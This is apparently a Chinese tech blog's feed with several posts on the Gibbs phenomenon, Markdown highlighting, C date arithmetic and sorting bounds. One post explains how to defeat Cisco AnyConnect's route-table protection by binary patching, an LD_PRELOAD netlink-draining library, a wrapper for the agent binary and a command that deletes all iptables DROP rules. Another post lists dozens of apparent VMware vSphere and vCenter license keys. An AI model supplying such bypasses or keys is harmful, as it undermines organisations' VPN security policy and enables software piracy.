      <url>/2022/09/23/shi-bo-qi-guan-hou-gan-fft-yu-ji-bu-si-xian-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="示波器观后感-fft与吉布斯现象">示波器观后感-FFT与吉布斯现象</h1><h2 id="吉布斯现象">吉布斯现象</h2><h3 id="tldr">TL;DR</h3><p>简单的说，也就是利用傅里叶级数描述分段连续可微周期函数的时候，会在间断点处出现很大的一个振荡，并且这个振荡并不会随着级数的阶数增加而减小，而是趋于一个恒定的值。</p><h3 id="现象">现象</h3><figure><img src="https://googles.plus/images/loading.gif" data-original="/images/Gibbs.jpg" alt="吉布斯现象产生的转折处振荡"><figcaption aria-hidden="true">吉布斯现象产生的转折处振荡</figcaption></figure><p><a href="https://yuleiwhu.github.io/dsp_mooc/_images/gibbs.png"></a></p><p>吉布斯现象，由亨利·威尔布里厄姆于1848年最先提出，并由约西亚·吉布斯于1899年证明。在工程应用时常用有限正弦项正弦波叠加逼近原周期信号。所用的谐波次数N的大小决定逼近原波形的程度，N增加，逼近的精度不断改善。</p><p>上面三幅图，分别是10、50、250阶傅里叶级数叠加得到波形图，可以发现，随着阶数的增加，振荡始终存在。</p><p>在信号处理中，吉布斯现象通常被认为是处理带来的干扰，需要被去除掉。比如，过冲或者由于振荡产生的振铃效应。另外，在滤波器设计中，由于窗函数引入导致的间断点问题，也会引发Gibbs现象，从而引起通带和阻带的振荡。</p><h2 id="fft">FFT</h2><h3 id="tldr-1">TL;DR</h3><p>示波器支持快速傅里叶变换（FFT）功能可以快速地把时域信号转化为频域分布</p><h3 id="方波的傅里叶展开">方波的傅里叶展开</h3><p><img src="https://googles.plus/images/loading.gif" data-original="https://kivenckl.github.io/post/7f534916/fangbo_nihe.png"></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://kivenckl.github.io/post/7f534916/fangbo.png"></p><p>同理，该方波在区间[−T2,T2]的傅里叶级数展开式为：</p><p><span class="math display">\[ f(t) \sim \frac{4{A_{max}}}{\pi}\sum\limits_{n = 1}^\infty  {\frac{sin((2n - 1)\omega t)}{2n - 1}}{\rm{        }}n = 1,2,3, \cdots  \]</span></p><p>其中：</p><p><span class="math display">\[ \omega  = \frac{2\pi }{T} \]</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 示波器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 代码高亮</title>
      <link href="/2022/09/21/markdown-dai-ma-gao-liang/"/>
      <url>/2022/09/21/markdown-dai-ma-gao-liang/</url>
      
        <content type="html"><![CDATA[<p>Hexo 使用的 Markdown CodePage 代码区域没有高亮，而且没有行号。</p><p>常用的 ` 来框起一个单词或短句，Markdown 最终会转化成<code>&lt;pre&gt;&lt;/pre&gt;</code> 或<code>&lt;code&gt;&lt;/code&gt;</code>。</p><p>对于成段的代码块，使用这种方式后代码区域显示出来的没有语法高亮，也没有行号，一点美感都没有，查询Markdown语法，发现了另外一种格式：</p><pre class="line-numbers language-none"><code class="language-none">{% raw %}{% codeblock [lang:language] [title] [url] [link text] %}code snippet{% endcodeblock %}{% endraw %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中： - lang 语言 - title 代码块上方的标题 - url为本段代码指定一个url，用于下载或引用 - link text url显示的文字</p><p>以下三个用于控制行号显示： - start:# 从第#行开始显示行号 - mark:#,#-#在第#行，以及第#-#行显示行号 - linenos:false true所有行都显示行号，false所有行都不显示行号</p><p>对于<strong>lang</strong>，这里列出了支持的语言以及对应的字段名，如java，cpp等，以上字段均为可选字段，可以使用默认值。</p><p>Java代码实例</p><pre class="line-numbers language-java" data-language="java"><div class="caption"><span>title</span><a href="http://www.example.com/">example.com</a></div><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Map</span> map1  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"a3"</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"cc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Iterator</span> keysIterator <span class="token operator">=</span> map1<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>keysIterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>keysIterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AnyConnect/OpenConnect 客户端代理转发技术分析</title>
      <link href="/2022/09/21/anyconnect-openconnect-ke-hu-duan-dai-li-zhuan-fa-ji-zhu-fen-xi/"/>
      <url>/2022/09/21/anyconnect-openconnect-ke-hu-duan-dai-li-zhuan-fa-ji-zhu-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="cisco-anyconnectopenconnect-客户端代理转发技术分析">CiscoAnyConnect/OpenConnect 客户端代理转发技术分析</h1><h2 id="普通的代理客户端如何转发客户端流量">普通的代理客户端如何转发客户端流量</h2><p>本文编写时，较为流行的代理软件有 Clash, Shadowsocks, Tarjan, V2Ray等，他们的 Windows 客户端无一例外地采用了 HTTP 代理或者 PAC的方式来转发用户流量。</p><p>这样做的好处是： - 每次开启和关闭代理功能时，只需要调用系统级别的HTTP代理开关即可 - PAC 可以容纳很大的域名和IP规则（GFW List）</p><p>当然了，也有缺点： - 部分软件不支持：终端 （需要配置环境变量）, UWP应用（需要配置 Local Loopback） -对于某些用户来说，不够安全（并非所有流量都经由隧道转发）</p><h2 id="cisco-anyconnect-如何转发客户端流量">Cisco AnyConnect如何转发客户端流量</h2><p>综上所述，Cisco AnyConnect 和各大厂商的 VPN软件都采取了同一种方式。维护 Windows的本地路由表（<code>ROUTE.EXE</code>）。</p><p>这个路由表是系统级别的，对所有软件生效。</p><p>这里我输出了我自己的路由表，作为例子。</p><pre class="line-numbers language-none"><code class="language-none">pwsh&gt; route PRINT -4                                                                                          ===========================================================================                                   Interface List 16...00 ff 76 77 13 94 ......TAP-Windows Adapter V9 36...00 15 5d fb 59 43 ......Hyper-V Virtual Ethernet Adapter 18...3c 2c 30 99 07 5e ......Realtek PCIe GbE Family Controller 32...0a 00 27 00 00 20 ......VirtualBox Host-Only Ethernet Adapter 25...b4 69 21 54 05 88 ......Intel(R) Wireless-AC 9462 31...b4 69 21 54 05 89 ......Microsoft Wi-Fi Direct Virtual Adapter #4 20...b6 69 21 54 05 88 ......Microsoft Wi-Fi Direct Virtual Adapter #5  9...00 50 56 c0 00 01 ......VMware Virtual Ethernet Adapter for VMnet1 29...00 50 56 c0 00 08 ......VMware Virtual Ethernet Adapter for VMnet8  1...........................Software Loopback Interface 1===========================================================================IPv4 Route Table===========================================================================Active Routes:Network Destination        Netmask          Gateway       Interface  Metric          0.0.0.0          0.0.0.0  &lt;My WAN IP&gt;  &lt;My WAN IP&gt;     26          0.0.0.0          0.0.0.0        10.12.0.1       10.12.0.68      2        10.12.0.0    255.255.255.0         On-link        10.12.0.68    257       10.12.0.68  255.255.255.255         On-link        10.12.0.68    257      10.12.0.255  255.255.255.255         On-link        10.12.0.68    257   &lt;VPN EXTERNAL GW&gt;  255.255.255.255  &lt;My WAN GW&gt;  &lt;My WAN IP&gt;     26        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331      169.254.0.0      255.255.0.0         On-link     169.254.92.21    281    169.254.92.21  255.255.255.255         On-link     169.254.92.21    281  169.254.255.255  255.255.255.255         On-link     169.254.92.21    281     172.18.240.0    255.255.240.0         On-link      172.18.240.1    271     172.18.240.1  255.255.255.255         On-link      172.18.240.1    271   172.18.255.255  255.255.255.255         On-link      172.18.240.1    271     192.168.38.0    255.255.255.0         On-link      192.168.38.1    291     192.168.38.1  255.255.255.255         On-link      192.168.38.1    291   192.168.38.255  255.255.255.255         On-link      192.168.38.1    291    192.168.232.0    255.255.255.0         On-link     192.168.232.1    291    192.168.232.1  255.255.255.255         On-link     192.168.232.1    291  192.168.232.255  255.255.255.255         On-link     192.168.232.1    291    &lt;My WAN SUBNET&gt;    255.255.255.0         On-link   &lt;My WAN IP&gt;    281  &lt;My WAN IP&gt;  255.255.255.255         On-link   &lt;My WAN IP&gt;    281  &lt;My WAN GW&gt;  255.255.255.255         On-link   &lt;My WAN IP&gt;    281        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331        224.0.0.0        240.0.0.0         On-link   &lt;My WAN IP&gt;    281        224.0.0.0        240.0.0.0         On-link     169.254.92.21    281        224.0.0.0        240.0.0.0         On-link     192.168.232.1    291        224.0.0.0        240.0.0.0         On-link      192.168.38.1    291        224.0.0.0        240.0.0.0         On-link      172.18.240.1    271        224.0.0.0        240.0.0.0         On-link        10.12.0.68    257  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331  255.255.255.255  255.255.255.255         On-link   &lt;My WAN IP&gt;   281  255.255.255.255  255.255.255.255         On-link     169.254.92.21    281  255.255.255.255  255.255.255.255         On-link     192.168.232.1    291  255.255.255.255  255.255.255.255         On-link      192.168.38.1    291  255.255.255.255  255.255.255.255         On-link      172.18.240.1    271  255.255.255.255  255.255.255.255         On-link        10.12.0.68    257===========================================================================Persistent Routes:  Network Address          Netmask  Gateway Address  Metric          0.0.0.0          0.0.0.0        10.12.0.1       1===========================================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>路由表主要分为两大部分，上部是我们的网卡，又叫适配器（Adapter），又叫接口（Interface）。分别拥有自己的 MAC，和 <strong>friendly-name</strong>.</p><p>而下方就是我们的路由表了。 我将逐行进行讲解。</p><p><code>Network Destination        Netmask          Gateway       Interface  Metric</code></p><p>这五个参数是一条路由的基本参数： - Network Destination 目标网段 -Netmask 其子网掩码 - Gateway 默认网关 - Interface 流量出接口 - Metric路由距离 （网段的规则不唯一时相当于优先级，越小越优先）</p><h3 id="直连流量出接口">直连流量出接口</h3><p><code>0.0.0.0          0.0.0.0  &lt;My WAN IP&gt;  &lt;My WAN IP&gt;     26</code></p><p>此路由指定了直连流量的出接口，为我们联网的网卡，在没连VPN时，它的路由距离是很小的，所以流量会从这里直接出去。这里AnyConnect 将其改为 <strong>26</strong>，在 miss 掉所有 AnyConnect的规则后，会匹配上此路由，进行直连。</p><h3 id="vpn-流量出接口">VPN 流量出接口</h3><p><code>0.0.0.0          0.0.0.0        10.12.0.1       10.12.0.68      2</code></p><p>VPN 的流量出接口，这里是 Remote 的 Inside IP</p><h3 id="remote-lan-流量代理路由">Remote LAN 流量代理路由</h3><p><code>10.12.0.255  255.255.255.255         On-link        10.12.0.68    257</code></p><p>将 LAN IP 交由VPN隧道代理。</p><h3 id="localhost">localhost</h3><p><code>127.0.0.1  255.255.255.255         On-link         127.0.0.1    331</code></p><p>天经地义，不能动。</p><h2 id="cisco-anyconnect-的路由表保护">Cisco AnyConnect的路由表保护</h2><p><strong>为了安全</strong>，AnyConnect客户端会监听路由表，确保其完整性。完成这一工作的是其客户端中的<code>CHostConfigMgr::StartInterfaceAndRouteMonitoring()</code>函数。</p><p>如果出于某种原因，你想修改路由表的话，你需要用 IDA 或者 OllyDebug修改这一函数，让他直接 return 掉。同时还需要绕过思科的 checksum检查。（位于 <code>vpnagentd.exe</code> 中）。</p><h3 id="一些黑魔法">一些黑魔法</h3><p>如果你碰巧使用的是 Linux系统，你可以尝试手写一个黑魔法函数——<code>_ZN14CHostConfigMgr32StartInterfaceAndRouteMonitoringEv</code></p><p>1.黑魔法函数</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;sys/socket.h&gt;#include &lt;linux/netlink.h&gt;int _ZN27CInterfaceRouteMonitorLinux20routeCallbackHandlerEv(){  int fd=50;          // max fd to try  char buf[8192];  struct sockaddr_nl sa;  socklen_t len = sizeof(sa);  while (fd) {     if (!getsockname(fd, (struct sockaddr *)&amp;sa, &amp;len)) {        if (sa.nl_family == AF_NETLINK) {           ssize_t n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);        }     }     fd--;  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.编译</p><p><code>gcc -o libhack.so -shared -fPIC hack.c</code></p><ol start="3" type="1"><li>安装 <code>libhack.so</code> 到 Cisco library path中：</li></ol><p><code>sudo cp libhack.so  /opt/cisco/anyconnect/lib/</code></p><ol start="4" type="1"><li>关闭 AnyConnect</li></ol><p><code>/etc/init.d/vpnagentd stop</code></p><ol start="5" type="1"><li>检查进程</li></ol><p><code>ps auxw | grep vpnagentd</code></p><p>如果它不肯体面，我们就帮它体面。</p><p><code>kill -9</code></p><ol start="6" type="1"><li>如果存在 <code>/etc/init.d/vpnagentd</code> 的话，尝试添加<code>LD_PRELOAD=/opt/cisco/anyconnect/lib/libhack.so</code>到底层二进制文件被调用的地方，最后应该看起来像这样：</li></ol><p><code>LD_PRELOAD=/opt/cisco/anyconnect/lib/libhack.so /opt/cisco/anyconnect/bin/vpnagentd</code></p><p>新版本的 AnyConnect 使用了 <code>/etc/init.d/vpnagentd</code> 而不是<code>/lib/systemd/system/vpnagentd.service</code></p><p>所以应该： </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /opt/cisco/anyconnect/bin/vpnagentd /opt/cisco/anyconnect/bin/vpnagentd.orig <span class="token operator">&amp;&amp;</span><span class="token punctuation">{</span> <span class="token builtin class-name">echo</span> <span class="token string">'#!/bin/bash'</span> <span class="token operator">&amp;&amp;</span>  <span class="token builtin class-name">echo</span> <span class="token string">"LD_PRELOAD=<span class="token environment constant">$HOME</span>/vpn/libhack.so exec /opt/cisco/anyconnect/bin/vpnagentd.orig"</span><span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /opt/cisco/anyconnect/bin/vpnagentd <span class="token operator">&amp;&amp;</span><span class="token function">sudo</span> <span class="token function">chmod</span> +x /opt/cisco/anyconnect/bin/vpnagentd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><ol start="7" type="1"><li>扫清六合，天下归一，是时候启动了</li></ol><p><code>/etc/init.d/vpnagentd start</code></p><ol start="8" type="1"><li>注意此时 AnyConnect 已经把路由表干烂了，需要手动修复：</li></ol><p><code>iptables-save | grep -v DROP | iptables-restore</code></p><ol start="9" type="1"><li>如果你有本地LAN的访问需求的话，自己改路由表。</li></ol><p>指定接口：</p><p><code>route add -net 192.168.1.0 netmask 255.255.255.0 dev wlan0</code></p><ol start="10" type="1"><li>检查结果</li></ol><p><code>route -n</code></p><p><strong>（未完待续）</strong></p><h2 id="reference">Reference</h2><ol type="1"><li><a href="https://unix.stackexchange.com/questions/106304/route-add-no-longer-works-when-i-connected-to-vpn-via-cisco-anyconnect-client">routeadd no longer works when I connected to VPN via cisco anyconnect client- StackOverflow</a></li><li><a href="https://superuser.com/questions/284709/how-to-allow-local-lan-access-while-connected-to-cisco-vpn">Howto allow local LAN access while connected to Cisco VPN?</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> AnyConnect </tag>
            
            <tag> OpenConnect </tag>
            
            <tag> 网络工程 </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算 N 天前的日期的艺术</title>
      <link href="/2022/09/20/ji-suan-n-tian-qian-de-ri-qi-de-yi-zhu/"/>
      <url>/2022/09/20/ji-suan-n-tian-qian-de-ri-qi-de-yi-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="section"></h1><h2 id="朴素的方法c">朴素的方法（C）</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">time_t</span> now <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tm <span class="token operator">*</span>e_lt <span class="token operator">=</span> <span class="token function">gmtime</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">time_t</span> s_tm <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s_tm <span class="token operator">-=</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">;</span>tm <span class="token operator">*</span>s_lt <span class="token operator">=</span> <span class="token function">gmtime</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s_tm<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是，<code>gmtime</code> 返回的指针指向的那片<strong>tm</strong> 结构体是全局共享的，也就是说两次 <code>gmtime</code>调用会返回同一个地址，第二次 <code>gmtime</code>把第一次的结果覆盖了。</p><p>加减时间戳这个想法是可以的，只是要换一种方式去字符串化时间戳。</p><h2 id="其他问题">其他问题</h2><ul><li>闰秒</li><li>夏令时</li></ul><h2 id="unix-时间戳">UNIX 时间戳</h2><p>UNIX 时间戳直接加减时可以的，因为 UNIX时间不考虑闰秒和夏令时，绝对时间轴，每天就是 <strong>24 * 60 *60</strong> 秒。 也可以通过 <code>struct tm</code>结构成员操作来计算偏移时间。</p><blockquote><p>Unix 时间戳是从 1970 年 1 月 1 日（ UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。</p></blockquote><h3 id="关于闰秒">关于闰秒</h3><p>闰秒的显示一般来说是不考虑的，闰秒的播发是通过网络或者 GPS ，比如NTP/PTP 时间同步这些，核心是纠正真实时间与 UTC 时间的偏差。Unix时间戳可以看作是 UTC 的一种表达方式而已。显示是根据当地时区夏令时来计算的。</p><p>想详细了解可以看看初步的 GPS 时间设计。</p><h2 id="c-20-standard">C++ 20 Standard</h2><blockquote><p>https://en.cppreference.com/w/cpp/chrono/day</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法随想】排序算法的极限在哪里？</title>
      <link href="/2022/09/19/suan-fa-sui-xiang-pai-xu-suan-fa-de-ji-xian-zai-na-li/"/>
      <url>/2022/09/19/suan-fa-sui-xiang-pai-xu-suan-fa-de-ji-xian-zai-na-li/</url>
      
        <content type="html"><![CDATA[<p><span class="math inline">\(n\)</span> 个元素有 <span class="math inline">\(n!\)</span> 种排列方式，每次比较可以获取 <span class="math inline">\(1b\)</span>的信息量，因此获得足够的用于比较的信息量需要的次数是 <span class="math inline">\({\log _2}(n!) \in \Omega (n\log n)\)</span>.</p><p>当然了还有一个最低的复杂度下界 <span class="math inline">\(\Omega(n)\)</span> ，程序总得把输入的数据读完，难道不是么？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware vSphere 6 序列号</title>
      <link href="/2022/09/14/vmware-vsphere-6-xu-lie-hao/"/>
      <url>/2022/09/14/vmware-vsphere-6-xu-lie-hao/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware-vsphere-6-序列号">VMware vSphere 6 序列号</h1><h2 id="vmware-vsphere-6-enterprise-plus">VMware vSphere 6 EnterprisePlus</h2><p>0A65P-00HD0-3Z5M1-M097M-22P7H</p><h2 id="vsphere-6-hypervisor">vSphere 6 Hypervisor</h2><p>HY0XH-D508H-081U8-JA2GH-CCUM2 4C4WK-8KH8L-H85J0-UHCNK-8CKQ8NV09R-2W007-08D38-CA956-33U28 JU400-6EK4L-080V9-QT8EP-2KAQ2 ## vSphere 6Hypervisor for Embedded OEMs</p><p>NC6HH-26J4N-48098-Y0AX0-1GA66 HY0J0-6L28H-081W8-4TCN0-32RP00V012-002DJ-480T1-UHAE0-9GULF 4G6WR-A0K4M-08420-J8CN6-8A2QA</p><h2 id="vsphere-6-desktop-host">vSphere 6 Desktop Host</h2><p>MF00U-65K53-H8DF9-Q20ZH-26R40 JV6D2-6YLDN-088C0-Q92N2-8Z00AHG49R-2234J-08EJ8-WC9E2-87H2D NV6TR-D4HD1-M84L1-P19QM-0PK3D</p><h2 id="vsphere-6-for-vcloud-service-provider-standard">vSphere 6 forvCloud Service Provider Standard</h2><p>JG2JK-DM01L-M8101-J8AZH-3LUH2 JZ41H-0X153-H8579-A32ZK-16H204A0HU-DU084-H8990-C9376-16KHF 1V0EA-FNK51-H85K8-H1AN6-2U8PD</p><h2 id="vcloud-suite-6-standard">vCloud Suite 6 Standard</h2><p>HV0N8-AC382-H8ET1-631X6-23K10 HU4EA-A52E2-H89V9-T295K-0V8Q4NZ4XH-2VK43-H8D30-6L974-97800 NU2DH-DW145-H81Y8-KL0QP-9GAQD</p><h2 id="vcloud-suite-6-advanced">vCloud Suite 6 Advanced</h2><p>MU2HU-DEHEQ-M85U0-N3356-07A5D HC0R0-AZJE3-08EF1-T99E6-86R32HG0JK-F4J1M-08E49-L91Q2-8K832 5U40R-D615H-M8EZ8-D82ZP-12848</p><h2 id="vcloud-suite-6-enterprise">vCloud Suite 6 Enterprise</h2><p>JY04H-DFJ01-M8869-428EM-96R60 5Y04R-AYKE3-H8DR8-NK0EM-1UAL2NC682-0GJ4P-08EM1-32ANM-0AU6F NZ2JR-6U286-H81N0-8V3Z6-1FHH2</p><h2 id="vsphere-with-operations-management-6-standard">vSphere withOperations Management 6 Standard</h2><p>HZ4J8-AWJ4Q-M8560-YT3Q6-0F052 JU24R-67H53-H8DF1-4L17K-8U208MY6DK-0K1D2-M80T0-UR1Z4-8CK42 JU4E2-2W085-M8D78-M0AZM-AARKF</p><h2 id="vsphere-with-operations-management-6-enterprise">vSphere withOperations Management 6 Enterprise</h2><p>JA60R-2JK84-M8DQ1-4L9N0-8VRP2 MG4T2-FY29P-480F9-9H0X0-16K1D1U65R-2Y24N-M8DR1-U2C50-16HQ8 1V2HU-26KD1-08D60-LH9GK-CPU6F</p><h2 id="vsphere-6-foundation">vSphere 6 Foundation</h2><p>JA6R2-DELEK-H8EP8-83AXP-07RQ8 0G6EA-07J5M-M8991-TJ0Z6-2U87DNU61R-ADKD2-488M9-CV8NH-A6K30 0Y050-A3L42-084C9-6LCGP-3AR3D</p><h2 id="vsphere-6-foundation-for-embedded-oems">vSphere 6 Foundation forEmbedded OEMs</h2><p>HA2JK-42HD4-H80C0-79CZ0-1L012 JY2E2-6W11L-H81K0-0A274-3ZU364G6HU-FF05N-085L1-R0ANM-C705F 4Y2TA-2R08P-H80H9-N317H-1ZK16</p><h2 id="vsphere-6-embedded-essentials">vSphere 6 EmbeddedEssentials</h2><p>NY6M2-D5H8L-489D0-280Z0-2Q004 HA080-FP203-M8830-XH9QM-3PU2DJF0NH-AGJ0P-H8EW0-2U85H-AU0QA HU09A-6F04H-08E90-G28Z6-1A808</p><h2 id="vsphere-6-embedded-foundation">vSphere 6 EmbeddedFoundation</h2><p>1A6H8-DT2D3-H8DR8-5L9EK-2AH18 4V088-D93DL-H89H9-3V8QH-C7H3DJU28A-DR3DN-489H9-JC8XH-CZ052 1U69U-0AL9L-08171-UHCXK-9622A</p><h2 id="vsphere-6-essentials">vSphere 6 Essentials</h2><p>NG2T0-AZ08N-484V0-KRC52-87K2D JY412-8MKEH-489U0-KL2Q0-0ZUQ80F44K-85J17-489U8-JH9N6-8F060 4G28H-0CLDQ-H80J0-V3AZ0-862KA</p><h2 id="vsphere-6-essentials-for-retail-and-branch-offices">vSphere 6Essentials for Retail and Branch Offices</h2><p>4U6NH-4D0EK-08EU9-JLCZ6-AU0J4 0G690-4F3EQ-M80G9-AR35M-AAUQ0NV29K-8PLE3-480U1-T9970-A6RJD 1Z2MK-6T243-484J0-6K954-AYULD</p><h2 id="vsphere-6-essentials-plus">vSphere 6 Essentials Plus</h2><p>MU2MR-6HH1P-48E11-8J3G4-2Y8NF HY0JR-AHK4H-08EM8-W22X6-0KU3F4Z0RH-0YK55-48089-820Z6-AC852 JZ4HR-DJJ50-M84G0-LJ0G4-A22QF</p><h2 id="vsphere-6-essentials-plus-for-retail-and-branch-offices">vSphere6 Essentials Plus for Retail and Branch Offices</h2><p>1Y24U-6K05Q-48989-PR9G2-CA262 NV0XK-6ML00-H8D21-FR954-AG0ND1G2MA-A2201-48DJ1-HC2E0-3ZA14 1V65R-0ZJ55-08870-KLAQH-0UA3F</p><h2 id="vsphere-6-standard">vSphere 6 Standard</h2><p>MG2T2-8FK0Q-H88H0-6RC50-9LU58 JU600-6YH91-M8DR8-D1CGP-330NDHV2WH-D2192-M84K1-RLC56-1A862 HG6R2-8NH52-088H9-X33QP-C68KD</p><h2 id="vsphere-6-standard-for-embedded-oems">vSphere 6 Standard forEmbedded OEMs</h2><p>4F6XU-ADK50-488K0-UJ0ZM-1U8J8 0Z29R-A028L-M80J9-3H3N6-8UU2D1Y68K-AG206-M8E38-298N0-8VUJD HF252-0X391-H8029-H835M-33834</p><h2 id="vsphere-6-enterprise">vSphere 6 Enterprise</h2><p>5Y04A-8934J-M85P1-3K37H-9P04D JA2NH-2Z191-08501-NCAX2-2VK4F0F2T2-DCK93-M88M8-7J9E4-16RJ0 NU0EK-05100-M80N9-501N2-8G81D</p><h2 id="vsphere-6-enterprise-for-embedded-oems">vSphere 6 Enterprise forEmbedded OEMs</h2><p>0V050-0XL9N-M85A8-LU1GK-0UA52 NG6H2-FT186-H8EV8-UH9NP-1F2085Y400-4G2EJ-481W8-R80GM-2K2NF 4Z44H-4R19K-H88T8-CT87P-0CKMD</p><h2 id="vsphere-6-enterprise-plus">vSphere 6 Enterprise Plus</h2><p>1F6XH-8VJ9L-481Y9-L835P-CFHHA 1G28U-AW18P-08189-72AE6-9URP84Y29R-D034H-48561-RLAG0-ACU40 JU640-0JKE3-088J9-GRCXK-2PRH6</p><h2 id="vsphere-6-enterprise-plus-for-embedded-oems">vSphere 6Enterprise Plus for Embedded OEMs</h2><p>1U0H2-DX354-H8961-Z2CN6-3C0M4 MY2DH-AFKDL-081A9-WR1XK-13HH85V2E2-AMLE4-08EF1-QHAZM-8YK20 4V692-D3KEL-M8088-NUAQ6-1Q0MD</p><h2 id="vcenter-server-6-essentials">vCenter Server 6 Essentials</h2><p>NU68U-6D04K-08EV8-GK95K-9LRN6 HG2T0-6F3D3-489L9-2T9QH-3QR12HZ05H-0W1EL-08EC0-E8AEK-8CKMF 4V24K-0J34Q-084D8-X19E2-03U2D</p><h2 id="vcenter-server-6-foundation">vCenter Server 6 Foundation</h2><p>MV692-29093-M85H0-6RC76-1Q230 5A6MU-0N057-08EF8-NT1Q0-2FU7D5C21A-6XK4H-089K8-2385M-3PAM8 NG6RA-ANK91-089Z9-P93ZH-0G016</p><h2 id="vcenter-server-6-standard">vCenter Server 6 Standard</h2><p>HG612-FH19H-08DL1-V19X2-1VKND NU4JA-4V2DQ-48428-T32GK-8VRN40Y4H2-8P217-H8900-M8AE4-2LH44 NA658-2308J-08809-93AQ6-278J0</p><h2 id="vcenter-server-6-standard-for-embedded-oems">vCenter Server 6Standard for Embedded OEMs</h2><p>1G2NU-AZL54-484X0-3TAN0-9GH2A JG69A-2T155-088J1-00A5M-1C0L8HC45A-DEK1M-081C9-QKCZ0-C2K3D NC4M8-2CL0M-08159-5V0E2-1GR3A</p><h2 id="virual-san-standard">Virual SAN Standard</h2><p>HZ2E0-0RKDL-485Y8-3L150-AYU52 NA69A-2Q385-M84D1-13370-322H2HA0RU-FEL03-M8408-AUA7M-2U8JD 0F0J8-8YH8P-488F1-JCAN0-1V21D</p><h2 id="virual-san">Virual 